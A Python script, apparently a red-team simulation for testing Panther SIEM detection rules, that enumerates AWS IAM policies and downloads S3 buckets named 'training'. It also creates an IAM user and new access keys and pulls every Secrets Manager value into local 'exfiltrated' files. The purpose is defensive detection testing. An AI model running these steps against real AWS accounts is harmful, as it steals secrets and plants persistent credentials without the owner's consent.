#!/usr/bin/env python3
"""
AWS Permission Enumeration Script for SIEM Rule Testing

This script enumerates AWS permissions and attempts various operations
to test security detection rules in Panther SIEM.
"""

import os
import sys
import tempfile
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, Any
import click
import boto3
from botocore.exceptions import ClientError, BotoCoreError
import colorama
from colorama import Fore, Style

# Initialize colorama for cross-platform colored output
colorama.init()

# Color constants
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
NC = Style.RESET_ALL


def dry_run_wrapper(func) -> Any:
    """Decorator to add dry-run support to methods"""
    def wrapper(self, *args, **kwargs) -> Any:
        if self.dry_run:
            method_name = func.__name__.replace('_', ' ').title()
            click.echo(f"[DRY RUN] Would execute: {method_name}")
            return None
        return func(self, *args, **kwargs)
    return wrapper


class AWSEnumerator:
    def __init__(self, profile_name: Optional[str] = None, region: str = 'us-west-2', dry_run: bool = False) -> None:
        self.profile_name = profile_name
        self.region = region
        self.dry_run = dry_run
        self.session = self._create_session() if not dry_run else None
        self.temp_dir: Optional[str] = None
        self.s3_dir: Optional[str] = None
        self.secrets_dir: Optional[str] = None
        
    def _create_session(self) -> boto3.Session:
        """Create boto3 session with specified profile"""
        try:
            if self.profile_name:
                return boto3.Session(profile_name=self.profile_name, region_name=self.region)
            else:
                return boto3.Session(region_name=self.region)
        except Exception as e:
            click.echo(f"{RED}[!] Error creating AWS session: {e}{NC}")
            sys.exit(1)
    
    def _setup_temp_directories(self) -> None:
        """Setup temporary directories for exfiltrated data"""
        self.temp_dir = tempfile.mkdtemp()
        self.s3_dir = os.path.join(self.temp_dir, 's3_data')
        self.secrets_dir = os.path.join(self.temp_dir, 'secrets_data')
        
        Path(self.s3_dir).mkdir(parents=True, exist_ok=True)
        Path(self.secrets_dir).mkdir(parents=True, exist_ok=True)
        
        click.echo(f"{YELLOW}[*] Exfiltrated data will be stored in: {self.temp_dir}{NC}")
    
    def get_caller_identity(self) -> Optional[Dict[str, Any]]:
        """Get current AWS identity"""
        click.echo(f"{GREEN}[+] Checking current identity...{NC}")
        
        if self.dry_run:
            identity = {
                'Account': '123456789012',
                'Arn': 'arn:aws:iam::123456789012:user/test-user',
                'UserId': 'AIDAEXAMPLE123456789'
            }
            click.echo(f"[DRY RUN] Account: {identity.get('Account')}")
            click.echo(f"[DRY RUN] User ARN: {identity.get('Arn')}")
            click.echo(f"[DRY RUN] User ID: {identity.get('UserId')}")
            return identity
        
        try:
            sts = self.session.client('sts')
            identity = sts.get_caller_identity()
            click.echo(f"Account: {identity.get('Account')}")
            click.echo(f"User ARN: {identity.get('Arn')}")
            click.echo(f"User ID: {identity.get('UserId')}")
            return identity
        except ClientError as e:
            click.echo(f"{RED}[!] Error getting caller identity: {e}{NC}")
            return None
    
    def list_user_policies(self, username: str) -> None:
        """List attached and inline policies for user"""
        # List attached policies
        click.echo(f"{GREEN}[+] Listing attached policies...{NC}")
        
        if self.dry_run:
            click.echo("[DRY RUN] Would list attached policies for user")
            click.echo("  - PowerUserAccess: arn:aws:iam::aws:policy/PowerUserAccess")
            click.echo("  - S3FullAccess: arn:aws:iam::aws:policy/AmazonS3FullAccess")
        else:
            iam = self.session.client('iam')
            try:
                attached_policies = iam.list_attached_user_policies(UserName=username)
                for policy in attached_policies['AttachedPolicies']:
                    click.echo(f"  - {policy['PolicyName']}: {policy['PolicyArn']}")
            except ClientError as e:
                click.echo(f"{RED}[!] Error listing attached policies: {e}{NC}")
        
        # List inline policies
        click.echo(f"{GREEN}[+] Listing inline policies...{NC}")
        
        if self.dry_run:
            click.echo("[DRY RUN] Would list inline policies for user")
            click.echo("  - inline-policy")
            click.echo("    Policy Document: {'Version': '2012-10-17', 'Statement': [...]}")
        else:
            iam = self.session.client('iam')
            try:
                inline_policies = iam.list_user_policies(UserName=username)
                for policy_name in inline_policies['PolicyNames']:
                    click.echo(f"  - {policy_name}")
                    
                    # Try to get inline policy document
                    try:
                        policy_doc = iam.get_user_policy(UserName=username, PolicyName=policy_name)
                        click.echo(f"    Policy Document: {policy_doc['PolicyDocument']}")
                    except ClientError:
                        pass
            except ClientError as e:
                click.echo(f"{RED}[!] Error listing inline policies: {e}{NC}")
    
    def enumerate_s3_buckets(self) -> None:
        """List S3 buckets and download training bucket contents"""
        click.echo(f"{GREEN}[+] Listing S3 buckets...{NC}")
        
        if self.dry_run:
            click.echo("[DRY RUN] Would list S3 buckets")
            click.echo("  - my-company-data")
            click.echo("  - training-data-bucket")
            click.echo("  - logs-bucket")
            click.echo(f"{RED}[!] Found bucket with 'training' in the name: training-data-bucket. Attempting to download contents...{NC}")
            click.echo(f"{YELLOW}[*] [DRY RUN] Would download s3://training-data-bucket{NC}")
            click.echo(f"{GREEN}[+] [DRY RUN] Simulated download complete{NC}")
            return
            
        try:
            s3 = self.session.client('s3')
            buckets = s3.list_buckets()
            
            training_buckets = []
            for bucket in buckets['Buckets']:
                bucket_name = bucket['Name']
                click.echo(f"  - {bucket_name}")
                
                if 'training' in bucket_name.lower():
                    training_buckets.append(bucket_name)
            
            # Download contents of training buckets
            for bucket_name in training_buckets:
                click.echo(f"{RED}[!] Found bucket with 'training' in the name: {bucket_name}. Attempting to download contents...{NC}")
                self._download_s3_bucket(bucket_name)
                
        except ClientError as e:
            click.echo(f"{RED}[!] Error listing S3 buckets: {e}{NC}")
    
    def _download_s3_bucket(self, bucket_name: str) -> None:
        """Download contents of S3 bucket"""
        bucket_dir = os.path.join(self.s3_dir, bucket_name)
        Path(bucket_dir).mkdir(parents=True, exist_ok=True)
        
        click.echo(f"{YELLOW}[*] Downloading s3://{bucket_name} to {bucket_dir}...{NC}")
        
        try:
            s3 = self.session.client('s3')
            paginator = s3.get_paginator('list_objects_v2')
            pages = paginator.paginate(Bucket=bucket_name)
            
            for page in pages:
                if 'Contents' in page:
                    for obj in page['Contents']:
                        key = obj['Key']
                        local_path = os.path.join(bucket_dir, key)
                        
                        # Create directory if needed
                        Path(local_path).parent.mkdir(parents=True, exist_ok=True)
                        
                        try:
                            s3.download_file(bucket_name, key, local_path)
                            click.echo(f"    Downloaded: {key}")
                        except ClientError as e:
                            click.echo(f"    Failed to download {key}: {e}")
            
            click.echo(f"{GREEN}[+] Download complete for {bucket_name}. Files stored in {bucket_dir}{NC}")
            
        except ClientError as e:
            click.echo(f"{RED}[!] Error downloading bucket {bucket_name}: {e}{NC}")
    
    def enumerate_ec2_instances(self) -> None:
        """List EC2 instances and check RunInstances permission"""
        click.echo(f"{GREEN}[+] Listing EC2 instances...{NC}")
        
        if self.dry_run:
            click.echo("[DRY RUN] Would list EC2 instances")
            click.echo("  - Instance ID: i-1234567890abcdef0, State: running")
            click.echo("  - Instance ID: i-0987654321fedcba0, State: stopped")
            click.echo(f"{GREEN}[+] Checking EC2 RunInstances permission...{NC}")
            click.echo(f"{GREEN}[+] [DRY RUN] EC2 RunInstances permission would be checked{NC}")
            return
            
        try:
            ec2 = self.session.client('ec2')
            instances = ec2.describe_instances()
            
            for reservation in instances['Reservations']:
                for instance in reservation['Instances']:
                    click.echo(f"  - Instance ID: {instance['InstanceId']}, State: {instance['State']['Name']}")
                    
        except ClientError as e:
            click.echo(f"{RED}[!] Error listing EC2 instances: {e}{NC}")
        
        # Check RunInstances permission
        click.echo(f"{GREEN}[+] Checking EC2 RunInstances permission...{NC}")
        try:
            ec2 = self.session.client('ec2')
            ec2.run_instances(
                ImageId='ami-07706bb32254a7fe5',
                MinCount=1,
                MaxCount=1,
                InstanceType='t2.micro',
                DryRun=True
            )
        except ClientError as e:
            if e.response['Error']['Code'] == 'DryRunOperation':
                click.echo(f"{GREEN}[+] EC2 RunInstances permission confirmed.{NC}")
            else:
                click.echo(f"{YELLOW}[!] No EC2 RunInstances permission: {e}{NC}")
    
    def test_iam_operations(self, username: str) -> None:
        """Test IAM operations like creating users and access keys"""
        timestamp = str(int(datetime.now().timestamp()))
        test_user = f"test-user-{timestamp}"
        
        if self.dry_run:
            click.echo(f"{GREEN}[+] Attempting to create a new IAM user...{NC}")
            click.echo(f"[DRY RUN] Would create user: {test_user}")
            click.echo(f"{GREEN}[+] Attempting to attach a policy...{NC}")
            click.echo(f"[DRY RUN] Would attach policy to {test_user}")
            click.echo(f"{GREEN}[+] Checking for existing access keys...{NC}")
            click.echo("  - Access Key ID: AKIAIOSFODNN7EXAMPLE, Status: Active")
            click.echo(f"{GREEN}[+] Attempting to create new access keys...{NC}")
            click.echo("[DRY RUN] Would create new access key")
            return
            
        iam = self.session.client('iam')
        
        # Try to create IAM user
        click.echo(f"{GREEN}[+] Attempting to create a new IAM user...{NC}")
        try:
            iam.create_user(UserName=test_user)
            click.echo(f"{GREEN}[+] Successfully created user: {test_user}{NC}")
        except ClientError as e:
            click.echo(f"{RED}[!] Failed to create user: {e}{NC}")
        
        # Try to attach policy
        click.echo(f"{GREEN}[+] Attempting to attach a policy...{NC}")
        try:
            iam.attach_user_policy(
                UserName=test_user,
                PolicyArn='arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess'
            )
            click.echo(f"{GREEN}[+] Successfully attached policy to {test_user}{NC}")
        except ClientError as e:
            click.echo(f"{RED}[!] Failed to attach policy: {e}{NC}")
        
        # Check existing access keys
        click.echo(f"{GREEN}[+] Checking for existing access keys...{NC}")
        try:
            keys = iam.list_access_keys(UserName=username)
            for key in keys['AccessKeyMetadata']:
                click.echo(f"  - Access Key ID: {key['AccessKeyId']}, Status: {key['Status']}")
        except ClientError as e:
            click.echo(f"{RED}[!] Error listing access keys: {e}{NC}")
        
        # Try to create new access keys
        click.echo(f"{GREEN}[+] Attempting to create new access keys...{NC}")
        try:
            new_key = iam.create_access_key(UserName=username)
            click.echo(f"{GREEN}[+] Created access key: {new_key['AccessKey']['AccessKeyId']}{NC}")
        except ClientError as e:
            click.echo(f"{RED}[!] Failed to create access key: {e}{NC}")
    
    def enumerate_secrets_manager(self) -> None:
        """Enumerate Secrets Manager across US regions"""
        click.echo(f"{GREEN}[+] Enumerating Secrets Manager across US regions...{NC}")
        us_regions = ['us-east-1', 'us-east-2', 'us-west-1', 'us-west-2']
        
        if self.dry_run:
            for region in us_regions:
                click.echo(f"{YELLOW}[*] Checking region: {region}{NC}")
                if region == 'us-east-1':
                    click.echo(f"{GREEN}[+] Found secrets in {region}:{NC}")
                    click.echo("  - database-password")
                    click.echo("  - api-key")
                    click.echo(f"{YELLOW}[*] Attempting to retrieve secret value for: database-password{NC}")
                    click.echo(f"{RED}[!] [DRY RUN] SUCCESSFULLY RETRIEVED SECRET: database-password{NC}")
                    click.echo(f"{YELLOW}[*] [DRY RUN] Secret value (first 100 chars): mysecretpassword123...{NC}")
                    click.echo(f"{GREEN}[+] [DRY RUN] Secret would be saved to file{NC}")
                else:
                    click.echo(f"{YELLOW}[!] No secrets found in region: {region}{NC}")
            return
        
        for region in us_regions:
            click.echo(f"{YELLOW}[*] Checking region: {region}{NC}")
            
            try:
                secrets_client = self.session.client('secretsmanager', region_name=region)
                secrets = secrets_client.list_secrets()
                
                if secrets['SecretList']:
                    click.echo(f"{GREEN}[+] Found secrets in {region}:{NC}")
                    
                    for secret in secrets['SecretList']:
                        secret_name = secret['Name']
                        click.echo(f"  - {secret_name}")
                        
                        # Try to get secret value
                        click.echo(f"{YELLOW}[*] Attempting to retrieve secret value for: {secret_name}{NC}")
                        try:
                            secret_value_response = secrets_client.get_secret_value(SecretId=secret_name)
                            secret_value = secret_value_response.get('SecretString', '')
                            
                            if secret_value:
                                click.echo(f"{RED}[!] SUCCESSFULLY RETRIEVED SECRET: {secret_name}{NC}")
                                click.echo(f"{YELLOW}[*] Secret value (first 100 chars): {secret_value[:100]}...{NC}")
                                
                                # Save to file for exfiltration simulation
                                secret_file = os.path.join(self.secrets_dir, f"secret_{region}_{secret_name}.txt")
                                with open(secret_file, 'w') as f:
                                    f.write(f"Region: {region}\n")
                                    f.write(f"Secret Name: {secret_name}\n")
                                    f.write(f"Retrieved: {datetime.now()}\n")
                                    f.write(f"Value: {secret_value}\n")
                                
                                click.echo(f"{GREEN}[+] Secret saved to: {secret_file}{NC}")
                            else:
                                click.echo(f"{YELLOW}[!] Could not retrieve secret value for: {secret_name}{NC}")
                                
                        except ClientError as e:
                            click.echo(f"{YELLOW}[!] Could not retrieve secret value for {secret_name}: {e}{NC}")
                else:
                    click.echo(f"{YELLOW}[!] No secrets found in region: {region}{NC}")
                    
            except ClientError as e:
                click.echo(f"{RED}[!] Error accessing Secrets Manager in {region}: {e}{NC}")
    
    def print_summary(self) -> None:
        """Print summary of exfiltrated data"""
        click.echo(f"\n{YELLOW}[*] Enumeration complete. Check the output above for successful operations.{NC}")
        click.echo(f"{GREEN}[+] Exfiltrated data summary:{NC}")
        click.echo(f"  - Temp directory: {self.temp_dir}")
        click.echo(f"  - S3 data: {self.s3_dir}")
        click.echo(f"  - Secrets data: {self.secrets_dir}")
        click.echo(f"{YELLOW}[*] To clean up, run: rm -rf {self.temp_dir}{NC}")


@click.command()
@click.option('--profile', help='AWS profile name to use')
@click.option('--region', default='us-west-2', help='AWS region to use (default: us-west-2)')
@click.option('--dry-run', is_flag=True, help='Simulate operations without making AWS calls')
def enumerate_permissions(profile: Optional[str], region: str, dry_run: bool) -> None:
    """
    Enumerate AWS permissions for SIEM rule testing.
    """
    click.echo(f"{YELLOW}[*] Starting AWS permission enumeration using profile: {profile or 'default'}...{NC}")
    
    if dry_run:
        click.echo(f"{YELLOW}[*] DRY RUN MODE - No actual AWS calls will be made{NC}")
    
    enumerator = AWSEnumerator(profile, region, dry_run)
    enumerator._setup_temp_directories()
    
    # Get caller identity and extract username
    identity = enumerator.get_caller_identity()
    if not identity:
        return
    
    # Extract username from ARN
    username = identity['Arn'].split('/')[-1] if identity['Arn'] else 'unknown'
    
    # Run enumeration steps
    enumerator.list_user_policies(username)
    enumerator.enumerate_s3_buckets()
    enumerator.enumerate_ec2_instances()
    enumerator.test_iam_operations(username)
    enumerator.enumerate_secrets_manager()
    enumerator.print_summary()


if __name__ == '__main__':
    enumerate_permissions()